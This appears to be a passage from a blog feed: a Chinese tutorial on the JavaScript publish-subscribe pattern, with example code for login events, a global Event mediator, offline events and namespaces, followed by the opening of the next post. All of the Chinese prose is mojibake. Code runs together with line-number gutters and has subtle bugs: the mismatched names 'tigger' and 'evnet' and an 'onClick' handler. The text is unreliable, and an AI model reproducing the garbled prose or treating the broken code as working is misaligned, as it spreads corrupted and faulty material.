ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼é‡å†™ä¹‹åŽï¼Œå¯¹ç”¨æˆ·æ¶ˆæ¯æ„Ÿå…´è¶£çš„ä¸šåŠ¡æ¨¡å—è¿›è¡Œè‡ªå®šè®¢é˜…ç™»å½•æˆåŠŸçš„æ¶ˆæ¯äº‹ä»¶ã€‚å½“ç™»å½•æˆåŠŸåŽï¼Œç™»å½•æ¨¡å—åªéœ€è¦å‘å¸ƒç™»å½•æˆåŠŸçš„æ¶ˆæ¯ï¼Œè€Œä¸šåŠ¡æ”¾æŽ¥å—åˆ°æ¶ˆæ¯ä¹‹åŽï¼Œå°±ä¼šå¼€å§‹è¿›è¡Œå„è‡ªçš„ä¸šåŠ¡å¤„ç†ï¼Œç™»å½•æ¨¡å—å¹¶ä¸å…³å¿ƒä¸šåŠ¡æ–¹ç©¶ç«Ÿéœ€è¦ä»€ä¹ˆï¼Œä¹Ÿä¸æƒ³åŽ»äº†è§£å®ƒçš„å†…éƒ¨ç»†èŠ‚ã€‚æ”¹å–„åŽçš„ä»£ç ï¼š 12345678910111213141516171819202122232425$.ajax('http://laibh.top?login',function(data)&#123; login.trigger('loginSucc',data); // å‘å¸ƒç™»å½•æˆåŠŸçš„æ¶ˆæ¯&#125;);// å„è‡ªæ¨¡å—ç›‘å¬ç™»å½•æˆåŠŸçš„æ¶ˆæ¯var header = (function()&#123; login.listen('loginSucc',function(data)&#123; header.setAvatar(data.avatar); &#125;); return&#123; setAvatar:function(avatar)&#123; console.log('è®¾ç½® header æ¨¡å—çš„å¤´åƒ'); &#125; &#125;&#125;)();var nav = (function()&#123; login.listen('loginSucc',function(data)&#123; nav.setAvatar(data.avatar); &#125;); return&#123; setAvatar:function(avatar)&#123; console.log('è®¾ç½® nav æ¨¡å—çš„å¤´åƒ'); &#125; &#125;&#125;)() å¦‚ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬éšæ—¶å¯ä»¥æŠŠ setAvatar çš„æ–¹æ³•æ”¹æˆå…¶ä»–çš„ï¼Œå¦‚æžœæœ‰å¤©ç™»å½•å®Œæˆä¹‹åŽï¼Œåˆå¢žåŠ ä¸€ä¸ªåˆ·æ–°æ”¶è´§åœ°å€åˆ—è¡¨çš„è¡Œä¸ºï¼Œé‚£ä¹ˆåªè¦åœ¨æ”¶è´§åœ°å€æ¨¡å—é‡Œé¢åŠ ä¸Šç›‘å¬æ¶ˆæ¯çš„æ–¹æ³•å°±å¯ä»¥äº†ã€‚è€Œè¿™å¯ä»¥è®©å¼€å‘è¯¥æ¨¡å—çš„åŒäº‹è‡ªå·±å®Œæˆï¼Œä½œä¸ºç™»å½•æ¨¡å—çš„å¼€å‘è€…ï¼Œæ°¸è¿œä¸ç”¨å†å…³å¿ƒè¿™äº›è¡Œä¸ºäº†ã€‚ 12345678910var address = (function()&#123; login.listen('loginSucc',function(obj)&#123; address.refresh(obj); &#125;); return&#123; refresh:function(avatar)&#123; console.log('åˆ·æ–°æ”¶è´§åœ°å€åˆ—è¡¨'); &#125; &#125;&#125;)() å…¨å±€çš„å‘å¸ƒ-è®¢é˜…å¯¹è±¡ä¼šæƒ³åˆšåˆšå®žçŽ°çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œæˆ‘ä»¬ç»™å”®æ¥¼å¯¹è±¡å’Œç™»å½•å¯¹è±¡éƒ½æ·»åŠ äº†è®¢é˜…å’Œå‘å¸ƒçš„åŠŸèƒ½ã€‚å…¶å®žè¿™é‡Œè¿˜æœ‰ä¸¤ä¸ªå°é—®é¢˜ï¼š æˆ‘ä»¬ç»™æ¯ä¸€ä¸ªå‘å¸ƒè€…å¯¹è±¡éƒ½æ·»åŠ äº† listen å’Œ trigger æ–¹æ³•ï¼Œä»¥åŠä¸€ä¸ªç¼“å­˜å¯¹è±¡ clientList ï¼Œè¿™é‡Œå…¶å®žæ˜¯ä¸€ç§èµ„æºæµªè´¹ã€‚ å°æ˜Žè·Ÿå”®æ¥¼å¤„å¯¹è±¡è¿˜æ˜¯å­˜åœ¨ä¸€å®šçš„è€¦åˆæ€§ï¼Œå°æ˜Žè‡³å°‘è¦çŸ¥é“å”®æ¥¼å¤„å¯¹è±¡çš„åå­—æ˜¯ salesOffices æ‰èƒ½é¡ºåˆ©çš„è®¢é˜…åˆ°äº‹ä»¶ 123salesOffice.listen('squareMeter100',function(price)&#123; console.log('ä»·æ ¼ï¼š',price);&#125;); å¦‚æžœå°æ˜Žè¿˜å…³å¿ƒ300å¹³æ–¹ç±³çš„æˆ¿å­ï¼Œè€Œè¿™å¥—æˆ¿å­çš„å–å®¶æ˜¯ salesOffices2 ï¼Œè¿™æ„å‘³ç€å°æ˜Žè¦å¼€å§‹è®¢é˜… salesOffices2 å¯¹è±¡ï¼š 123salesOffice2.listen('squareMeter300',function(price)&#123; console.log('ä»·æ ¼ï¼š',price);&#125;); å…¶å®žåœ¨çŽ°å®žä¸­ï¼Œä¹°æˆ¿å­æœªå¿…è¦åŽ»åˆ°å”®æ¥¼å¤„ï¼Œæˆ‘ä»¬åªè¦æŠŠè®¢é˜…æ¶ˆæ¯çš„è¯·æ±‚è½¬äº¤ç»™ä¸­ä»‹å…¬å¸ï¼Œè€Œå„å¤§æˆ¿äº§å…¬å¸ä¹Ÿåªéœ€è¦é€šè¿‡ä¸­ä»‹å…¬å¸æ¥å‘å¸ƒæˆ¿å­æ¶ˆæ¯ã€‚è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å…³å¿ƒæ¶ˆæ¯æ˜¯æ¥è‡ªå“ªä¸ªæˆ¿äº§å…¬å¸ï¼Œæˆ‘ä»¬åœ¨æ„çš„æ˜¯æ˜¯å¦èƒ½å¤Ÿé¡ºåˆ©æ”¶åˆ°æ¶ˆæ¯ã€‚å½“ç„¶ï¼Œä¸ºäº†ä¿è¯è®¢é˜…è€…å’Œå‘å¸ƒè€…èƒ½é¡ºåˆ©é€šä¿¡ï¼Œè®¢é˜…è€…å’Œå‘å¸ƒè€…éƒ½å¿…é¡»çŸ¥é“è¿™ä¸ªä¸­ä»‹å…¬å¸ã€‚ åŒæ ·åœ¨ç¨‹åº ä¸­ï¼Œå‘å¸ƒ-è®¢é˜…æ¨¡å¼å¯ä»¥ç”¨ä¸€ä¸ªå…¨å±€çš„ Event å¯¹è±¡æ¥å®žçŽ°ï¼Œè®¢é˜…è€…ä¸éœ€è¦äº†è§£æ¶ˆæ¯æ¥è‡ªå“ªä¸ªå‘å¸ƒè€…ï¼Œå‘å¸ƒè€…ä¹Ÿä¸çŸ¥é“æ¶ˆæ¯ä¼šæŽ¨é€å“ªä¸ªè®¢é˜…è€…ï¼ŒEvent ä½œä¸ºä¸€ä¸ªç±»ä¼¼â€œä¸­ä»‹è€…â€çš„è§’è‰²ï¼ŒæŠŠè®¢é˜…è€…å’Œå‘å¸ƒè€…è”ç³»èµ·æ¥ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var Event = (function()&#123; var clientList = &#123;&#125;, listen, tigger, remove; listen = function(key,fn)&#123; if(!clientList[key])&#123; clientList[key] = [] &#125; clientList[key].push(fn); &#125;; trigger = function()&#123; var key = Array.prototype.shift.call(arguments), fns = clientList[key]; if(!fns || fns.length === 0)&#123; return false &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); &#125; &#125;; remove = function(key,fn)&#123; var fns = clientList[key]; if(!fns)&#123; return false &#125; if(!fn)&#123; fns &amp;&amp; (fns.length = 0) &#125;else&#123; for(var l = fns.length-1;l&gt;=0;l--)&#123; var _fn = fns[l]; if(_fn === fn)&#123; fns.splice(l,1); &#125; &#125; &#125; &#125;; return&#123; listen:listen, trigger:trigger, remove:remove, &#125; &#125;)();Event.listen('squareMeter88',function(price)&#123; // è®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼ï¼š',price);&#125;);Event.trigger('squareMeter88',200000); /// å”®æ¥¼å¤„å‘å¸ƒæ¶ˆæ¯ æ¨¡å—é—´é€šä¿¡ä¸Šé¢çš„å®žçŽ°å‘å¸ƒ-è®¢é˜…æ¨¡å¼çš„å®žçŽ°ï¼Œæ˜¯åŸºäºŽä¸€ä¸ªå…¨å±€çš„ Event å¯¹è±¡ï¼Œæˆ‘ä»¬åˆ©ç”¨å®ƒå¯ä»¥åœ¨ä¸¤ä¸ªå°è£…è‰¯å¥½çš„æ¨¡å—ä¸­é€šä¿¡ï¼Œè¿™ä¸¤ä¸ªæ¨¡å—å¯ä»¥å®Œå…¨ä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ã€‚å°±å¦‚åŒæœ‰äº†ä¸­ä»‹å…¬å¸ä¸€æ ·ï¼Œæˆ‘ä»¬ä¸å†éœ€è¦æˆ¿å­å‡ºå”®çš„æ¶ˆæ¯æ¥è‡ªå“ªä¸ªå”®æ¥¼å¤„ã€‚ æ¯”å¦‚çŽ°åœ¨æœ‰ä¸¤ä¸ªæ¨¡å—ï¼Œaæ¨¡å—ä¸­æœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œæ¯æ¬¡ç‚¹å‡»æŒ‰é’®ä¹‹åŽï¼Œbæ¨¡å—ä¸­çš„ div ä¸­ä¼šæ˜¾ç¤ºæŒ‰é’®çš„æ€»ç‚¹å‡»æ¬¡æ•°ï¼Œæˆ‘ä»¬ç”¨å…¨å±€çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼å®Œæˆä¸‹é¢çš„ä»£ç ï¼Œä½¿å¾— a æ¨¡å—å’Œ b æ¨¡å—å¯ä»¥åœ¨ä¿æŒå°è£…æ€§çš„å‰æä¸‹è¿›è¡Œé€šä¿¡ï¼š 12&lt;button id="count"&gt;ç‚¹æˆ‘&lt;/button&gt;&lt;div id="show"&gt;&lt;/div&gt; 1234567891011121314var a = (function()&#123; var count = 0; var button = document.getElementById('count'); button.onClick = function()&#123; Event.trigger('add',count++); &#125;&#125;)()var b = (function()&#123; var div = document.getElementById('show'); Event.listen('add',function(count)&#123; div.innerHTML = count; &#125;);&#125;)() ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬è¦ç•™æ„å¦ä¸€ä¸ªé—®é¢˜ï¼Œæ¨¡å—ä¹‹é—´ç”¨äº†å¤ªå¤šçš„å…¨éƒ¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼æ¥é€šä¿¡ï¼Œé‚£ä¹ˆæ¨¡å—ä¸Žæ¨¡å—ä¹‹é—´çš„è”ç³»å°±è¢«éšè—åˆ°äº†èƒŒåŽã€‚æˆ‘ä»¬æœ€ç»ˆä¼šæžä¸æ¸…æ¥šæ¶ˆæ¯æ¥è‡ªå“ªä¸ªæ¨¡å—ï¼Œæˆ–è€…æ¶ˆæ¯ä¼šæµå‘å“ªäº›æ¨¡å—ï¼Œè¿™åˆä¼šç»™æˆ‘ä»¬çš„ç»´æŠ¤å¸¦æ¥ä¸€äº›éº»çƒ¦ï¼Œä¹Ÿè®¸æŸä¸ªæ¨¡å—çš„ä½œç”¨å°±æ˜¯æš´éœ²ä¸€äº›æŽ¥å£ç»™å…¶ä»–æ¨¡å—è°ƒç”¨ã€‚ å¿…é¡»å…ˆè®¢é˜…å†å‘å¸ƒå—æˆ‘ä»¬æ‰€äº†è§£çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œéƒ½æ˜¯è®¢é˜…è€…å¿…é¡»å…ˆè®¢é˜…ä¸€ä¸ªæ¶ˆæ¯ï¼ŒéšåŽæ‰èƒ½æŽ¥å—åˆ°å‘å¸ƒè€…å‘å¸ƒçš„æ¶ˆæ¯ï¼Œå¦‚æžœæŠŠé¡ºåºåè¿‡æ¥ï¼Œå‘å¸ƒè€…å…ˆå‘å¸ƒä¸€æ¡æ¶ˆæ¯ï¼Œè€Œåœ¨æ­¤ä¹‹å‰æ²¡æœ‰å¯¹è±¡æ¥è®¢é˜…å®ƒï¼Œè¿™æ¡æ¶ˆæ¯æ— ç–‘å°†æ¶ˆå¤±åœ¨å®‡å®™ä¸­ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°†è¿™æ¡æ¶ˆæ¯ä¿å­˜ä¸‹æ¥ï¼Œç­‰åˆ°æœ‰å¯¹è±¡æ¥è®¢é˜…å®ƒçš„æ—¶å€™ï¼Œå†é‡æ–°æŠŠæ¶ˆæ¯å‘å¸ƒç»™è®¢é˜…è€…ã€‚å°±åŒ QQ æ¶ˆæ¯ä¸­çš„ç¦»çº¿æ¶ˆæ¯ä¸€æ ·ï¼Œç¦»çº¿æ¶ˆæ¯è¢«ä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼ŒæŽ¥æ”¶äººä¸ä¸‹æ¬¡ç™»å½•ä¸Šçº¿ä¹‹åŽï¼Œå¯ä»¥é‡æ–°æŽ¥å—è¿™æ¡æ¶ˆæ¯ã€‚è¿™ç§éœ€æ±‚åœ¨å®žé™…é¡¹ç›®ä¸­æ˜¯å­˜åœ¨çš„ï¼Œæ¯”å¦‚åœ¨ä¹‹å‰çš„å•†åŸŽç½‘ç«™ä¸­ï¼ŒèŽ·å–åˆ°ç”¨æˆ·æ¶ˆæ¯ä¹‹åŽæ‰èƒ½æ¸²æŸ“ç”¨æˆ·å¯¼èˆªæ¨¡å—ï¼Œè€ŒèŽ·å–ç”¨æˆ·æ¶ˆæ¯çš„æ“ä½œæ˜¯ä¸€ä¸ª ajax å¼‚æ­¥è¯·æ±‚ï¼Œå½“ ajax è¯·æ±‚æˆåŠŸè¿”å›žä¹‹åŽä¼šå‘å¸ƒä¸€ä¸ªäº‹ä»¶ï¼Œåœ¨æ­¤ä¹‹å‰è®¢é˜…äº† è¿™ä¸ªäº‹ä»¶çš„ç”¨æˆ·å¯¼èˆªæ¨¡å—å¯ä»¥æŽ¥æ”¶è¿™äº›ç”¨æˆ·ä¿¡æ¯ã€‚ ä½†æ˜¯è¿™åªæ˜¯ç†æƒ³çš„çŠ¶å†µï¼Œå› ä¸ºå¼‚æ­¥çš„åŽŸå› ï¼Œæˆ‘ä»¬ä¸èƒ½ä¿è¯ ajax è¯·æ±‚è¿”å›žçš„æ—¶é—´ï¼Œæœ‰æ—¶å€™å®ƒè¿”å›žå¾—æ¯”è¾ƒå¿«ï¼Œè€Œæ­¤æ—¶ç”¨æˆ·å¯¼èˆªæ¨¡å—çš„ä»£ç è¿˜æ²¡æœ‰åŠ è½½å¥½ï¼ˆè¿˜æ²¡æœ‰è®¢é˜…å¯¹åº”çš„äº‹ä»¶ï¼‰ï¼Œç‰¹åˆ«æ˜¯åœ¨ç”¨äº†ä¸€äº›æ¨¡å—åŒ–æƒ°æ€§åŠ è½½çš„æŠ€æœ¯åŽï¼Œè¿™æ˜¯å¾ˆæœ‰å¯èƒ½å‘ç”Ÿçš„äº‹æƒ…ã€‚ä¹Ÿè®¸æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªæ–¹æ¡ˆï¼Œä½¿å¾—æˆ‘ä»¬çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼æ‹¥æœ‰å…ˆå‘å¸ƒåŽè®¢é˜…çš„åŠŸèƒ½ã€‚ ä¸ºäº†æ»¡è¶³è¿™ä¸ªéœ€æ±‚ï¼Œæˆ‘ä»¬è¦å»ºç«‹ä¸€ä¸ªå­˜æ”¾ç¦»çº¿äº‹ä»¶çš„å †æ ˆï¼Œå½“äº‹ä»¶å‘å¸ƒçš„æ—¶å€™ï¼Œå¦‚æžœæ­¤æ—¶è¿˜æ²¡æœ‰è®¢é˜…è€…æ¥è®¢é˜…è¿™ä¸ªäº‹ä»¶ï¼Œæˆ‘ä»¬æš‚æ—¶æŠŠå‘å¸ƒäº‹ä»¶çš„åŠ¨ä½œåŒ…è£¹åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œè¿™äº›åŒ…è£…å‡½æ•°å°†è¢«å­˜å…¥å †æ ˆä¸­ï¼Œç­‰åˆ°ç»ˆäºŽæœ‰å¯¹è±¡æ¥è®¢é˜…æ­¤äº‹ä»¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°†éåŽ†å †æ ˆå¹¶ä¸”ä¾æ¬¡æ‰§è¡Œè¿™äº›åŒ…è£…å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯é‡æ–°å‘å¸ƒé‡Œé¢çš„äº‹ä»¶ã€‚å½“ç„¶ç¦»çº¿äº‹ä»¶çš„ç”Ÿå‘½å‘¨æœŸåªæœ‰ä¸€æ¬¡ï¼Œå°±åƒQQ çš„æœªè¯»æ¶ˆæ¯åªä¼šé‡æ–°é˜…è¯»ä¸€æ¬¡ï¼Œæ‰€ä»¥åˆšæ‰çš„æ“ä½œæˆ‘ä»¬åªèƒ½è¿›è¡Œä¸€æ¬¡ã€‚ å…¨å±€äº‹ä»¶çš„å‘½åå†²çªå…¨å±€çš„å‘å¸ƒ-è®¢é˜…å¯¹è±¡é‡Œåªæœ‰ä¸€ä¸ª clientList æ¥å­˜æ”¾æ¶ˆæ¯åå’Œå›žè°ƒå‡½æ•°ï¼Œå¤§å®¶éƒ½é€šè¿‡å®ƒæ¥è®¢é˜…å’Œå‘å¸ƒå„ç§æ¶ˆæ¯ï¼Œä¹…è€Œä¹…ä¹‹ï¼Œéš¾å…ä¼šå‡ºçŽ°äº‹ä»¶åå†²çªçš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥ç»™ Event å¯¹è±¡æä¾›åˆ›å»ºå‘½åç©ºé—´çš„åŠŸèƒ½ã€‚ åœ¨æä¾›ä»£ç ä¹‹å‰ï¼Œå…ˆæ„Ÿå—ä¸€ä¸‹æ€Žä¹ˆä½¿ç”¨è¿™ä¸¤ä¸ªæ–°å¢žçš„åŠŸèƒ½ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142// å…ˆå‘å¸ƒåŽè®¢é˜…Event.trigger('click',1);Event.listen('click',function(a)&#123; console.log(a); // è¾“å‡ºï¼š1&#125;);// ä½¿ç”¨å‘½åç©ºé—´Event.create('namespace1').listen('click',function(a)&#123; console.log(a); // 1&#125;);Event.create('namespace1').trigger('click',1);Event.create('namespace2').listen('click',function(a)&#123; console.log(a); // 1&#125;);Event.create('namespace2').trigger('click',2);// å…·ä½“çš„å®žçŽ°ä»£ç var Event = (function()&#123; var global = this, Event, _default = 'default'; Event = function()&#123; var _listen, _trigger, _remove, _slice = Array.prototype.slice, _shift = Array.prototype.shift, _unshift = Array.prototype.unshift, namespaceCache = &#123;&#125;, _create, find, each = function(ary,fn)&#123; var ret; for(var i=0,l=ary.length;i&lt;l;i++)&#123; var n = ary[i]; ret = fn.call(n,i,n); &#125; return ret; &#125;; _listen = function(key,fn,cache)&#123; if(!cache[key])&#123; cache[key] = []; &#125; cache[key].push(fn); &#125;; _trigger = function()&#123; var cache = _shift.call(arguments), key = _shift.call(arguments), args = arguments, _self = this, ret, stack = cache[key]; if(!stack || !stack.length)&#123; return; &#125; return each(stack,function()&#123; return this.apply(_self,args); &#125;); &#125;; _remove = function(key,cache,fn)&#123; if(cache[key])&#123; if(fn)&#123; for(var i=cache[key].length;i&gt;=0;i--)&#123; if(cache[key][i] === fn)&#123; cache[key].splice(i,1); &#125; &#125; &#125;else&#123; cache[key] = []; &#125; &#125; &#125;; _create = function(namespace)&#123; var namespace = namespace || _default; var cache = &#123;&#125;, offlineStack = [], // ç¦»çº¿äº‹ä»¶ ret = &#123; listen:function(key,fn,last)&#123; _listen(key,fn,cache); if(offlineStack === null)&#123; return; &#125; if(last === 'last')&#123; offlineStack.length &amp;&amp; offlineStack.pop()(); &#125;else&#123; each(offlineStack,function()&#123; this(); &#125;); &#125; offlineStack = null; &#125;, one:function(key,fn,last)&#123; _remove(key,cache); this.listen(key,fn,last); &#125;, remove:function(key,fn)&#123; _remove(key,cache,fn); &#125;, trigger:function()&#123; var fn, args, _self = this; _unshift.call(arguments,cache); args = arguments; fn = function()&#123; return _trigger.apply(_self,args); &#125;; if(offlineStack)&#123; return offlineStack.push(fn); &#125; return fn(); &#125; &#125;; return namespace ? (namespaceCache[namespace]? namespaceCache[namespace]:namespaceCache[namespace] = ret):ret; &#125;; return &#123; create:_create, one:function(key,fn,last)&#123; var event = this.create(); event.one(key,fn,last); &#125;, remove:function(key,fn)&#123; var evnet = this.create(); event.remove(key,fn); &#125;, listen:function(key,fn,last)&#123; var event = this.create(); event.listen(key,fn,last); &#125;, trigger:function()&#123; var event = this.create(); event.trigger.apply(this,arguments); &#125; &#125;; &#125;(); return Event;&#125;)() JavaScript å®žçŽ°çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼çš„ä¾¿åˆ©æ€§åœ¨ JAVA ä¸­å®žçŽ°ä¸€ä¸ªè‡ªå·±çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œé€šå¸¸ä¼šæŠŠè®¢é˜…è€…å¯¹è±¡è‡ªèº«å½“åšå¼•ç”¨ä¼ å…¥å‘å¸ƒè€…å¯¹è±¡ä¸­ï¼ŒåŒæ—¶è®¢é˜…è€…å¯¹è±¡è¿˜éœ€è¦æä¾›ä¸€ä¸ªåä¸ºè¯¸å¦‚ update çš„æ–¹æ³•ï¼Œä¾›å‘å¸ƒè€…å¯¹è±¡åœ¨é€‚åˆçš„æ—¶å€™è°ƒç”¨ã€‚è€Œåœ¨ JavaScript ä¸­ï¼Œæˆ‘ä»¬ç”¨æ³¨å†Œå›žè°ƒå‡½æ•°çš„å½¢å¼æ¥æ›¿ä»£ä¼ ç»Ÿçš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œæ˜¾å¾—æ›´åŠ ä¼˜é›…å’Œç®€å•ã€‚ å¦å¤–ï¼Œåœ¨ JavaScript ä¸­æ— éœ€é€‰æ‹©åŽ»ä½¿ç”¨æŽ¨æ¨¡åž‹è¿˜æ˜¯æ‹‰æ¨¡åž‹ï¼ŒæŽ¨æ¨¡åž‹æ˜¯æŒ‡åœ¨äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå‘å¸ƒè€…ä¸€æ¬¡æ€§æŠŠæ‰€æœ‰æ›´æ”¹çš„çŠ¶æ€å’Œæ•°æ®éƒ½æŽ¨é€ç»™è®¢é˜…è€…ã€‚æ‹‰æ¨¡åž‹ä¸åŒçš„æ˜¯ï¼Œå‘å¸ƒè€…ä»…ä»…é€šçŸ¥è®¢é˜…è€…äº‹ä»¶å·²ç»å‘ç”Ÿäº†ï¼Œæ­¤å¤–å‘å¸ƒè€…è¦æä¾›ä¸€äº›å…¬å¼€çš„æŽ¥å£ä¾›è®¢é˜…è€…æ¥ä¸»åŠ¨æ‹‰å–æ•°æ®ã€‚æ‹‰æ¨¡åž‹çš„å¥½å¤„æ˜¯è®©è®¢é˜…è€…â€œæŒ‰éœ€æ‹‰å–â€ï¼Œä½†åŒæ—¶æœ‰å¯èƒ½è®©å‘å¸ƒè€…æˆä¸ºä¸€ä¸ªâ€œé—¨æˆ·å¤§å¼€â€çš„å¯¹è±¡ï¼ŒåŒæ—¶å¢žåŠ äº†ä»£ç é‡å’Œå¤æ‚åº¦ã€‚ åœ¨ JavaScript ä¸­ï¼Œarguments å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¡¨ç¤ºå‚æ•°åˆ—è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬ä¼šé€‰æ‹©æŽ¨æ¨¡åž‹ï¼Œä½¿ç”¨ Function.prototype.apply æŠŠæ‰€æœ‰çš„æ•°æ®éƒ½æŽ¨ç»™è®¢é˜…è€…ã€‚ å°ç»“æœ¬ç« æˆ‘ä»¬å­¦ä¹ äº†å‘å¸ƒâ€”è®¢é˜…æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„è§‚å¯Ÿè€…æ¨¡å¼ã€‚å‘å¸ƒâ€”è®¢é˜…æ¨¡å¼åœ¨å®žé™…å¼€å‘ä¸­éžå¸¸æœ‰ç”¨ã€‚ å‘å¸ƒâ€”è®¢é˜…æ¨¡å¼çš„ä¼˜ç‚¹éžå¸¸æ˜Žæ˜¾ï¼Œä¸€ä¸ºæ—¶é—´ä¸Šçš„è§£è€¦ï¼ŒäºŒä¸ºå¯¹è±¡ä¹‹é—´çš„è§£è€¦ã€‚å®ƒçš„åº”ç”¨éžå¸¸å¹¿æ³›ï¼Œæ—¢å¯ä»¥ç”¨åœ¨å¼‚æ­¥ç¼–ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆæ›´æ¾è€¦åˆçš„ä»£ç ç¼–å†™ã€‚å‘å¸ƒâ€”è®¢é˜…æ¨¡å¼è¿˜å¯ä»¥ç”¨æ¥å¸®åŠ©å®žçŽ°ä¸€äº›åˆ«çš„è®¾è®¡æ¨¡å¼ï¼Œæ¯”å¦‚ä¸­ä»‹è€…æ¨¡å¼ã€‚ä»Žæž¶æž„ä¸Šæ¥çœ‹ï¼Œæ— è®ºæ˜¯ MVC è¿˜æ˜¯ MVVMï¼Œéƒ½å°‘ä¸äº†å‘å¸ƒâ€”è®¢é˜…æ¨¡å¼çš„å‚ä¸Žï¼Œè€Œä¸” JavaScript æœ¬èº«ä¹Ÿæ˜¯ä¸€é—¨åŸºäºŽäº‹ä»¶é©±åŠ¨çš„è¯­è¨€. å½“ç„¶ï¼Œå‘å¸ƒâ€”è®¢é˜…æ¨¡å¼ä¹Ÿä¸æ˜¯å®Œå…¨æ²¡æœ‰ç¼ºç‚¹ã€‚åˆ›å»ºè®¢é˜…è€…æœ¬èº«è¦æ¶ˆè€—ä¸€å®šçš„æ—¶é—´å’Œå†…å­˜ï¼Œè€Œä¸”å½“ä½ è®¢é˜…ä¸€ä¸ªæ¶ˆæ¯åŽï¼Œä¹Ÿè®¸æ­¤æ¶ˆæ¯æœ€åŽéƒ½æœªå‘ç”Ÿï¼Œä½†è¿™ä¸ªè®¢é˜…è€…ä¼šå§‹ç»ˆå­˜åœ¨äºŽå†…å­˜ä¸­ã€‚å¦å¤–ï¼Œå‘å¸ƒâ€”è®¢é˜…æ¨¡å¼è™½ç„¶å¯ä»¥å¼±åŒ–å¯¹è±¡ä¹‹é—´çš„è”ç³»ï¼Œä½†å¦‚æžœè¿‡åº¦ä½¿ç”¨çš„è¯ï¼Œå¯¹è±¡å’Œå¯¹è±¡ä¹‹é—´çš„å¿…è¦è”ç³»ä¹Ÿå°†è¢«æ·±åŸ‹åœ¨èƒŒåŽï¼Œä¼šå¯¼è‡´ç¨‹åºéš¾ä»¥è·Ÿè¸ªç»´æŠ¤å’Œç†è§£ã€‚ç‰¹åˆ«æ˜¯æœ‰å¤šä¸ªå‘å¸ƒè€…å’Œè®¢é˜…è€…åµŒå¥—åˆ°ä¸€èµ·çš„æ—¶å€™ï¼Œè¦è·Ÿè¸ªä¸€ä¸ª bug ä¸æ˜¯ä»¶è½»æ¾çš„äº‹æƒ…ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å‰è¨€å‡†å¤‡]]></title>
    <url>%2F2019-01-26-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%89%8D%E8%A8%80%E5%87%86%E5%A4%87.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å‰è¨€å‡†å¤‡åœ¨å¼€å§‹ä¹‹å‰ï¼Œå¤ä¹ ä¸€ä¸‹é—­åŒ…å’Œé«˜é˜¶å‡½æ•°ã€‚ é—­åŒ…å’Œé«˜é˜¶å‡½æ•°è™½ç„¶ï¼ŒJavaScript æ˜¯ä¸€é—¨å®Œæ•´çš„é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œä½†è¿™é—¨è¯­è¨€åŒæ—¶ä¹Ÿæœ‰è®¸å¤šå‡½æ•°å¼è¯­è¨€çš„ç‰¹æ€§ã€‚ å‡½æ•°å¼è¯­è¨€çš„é¼»ç¥–æ˜¯ LISP ï¼ŒJavaScript åœ¨è®¾è®¡ä¹‹åˆå‚è€ƒäº† LISP ä¸¤å¤§æ–¹è¨€ä¹‹ä¸€çš„ Scheme ï¼Œå¼•å…¥äº† Lambda 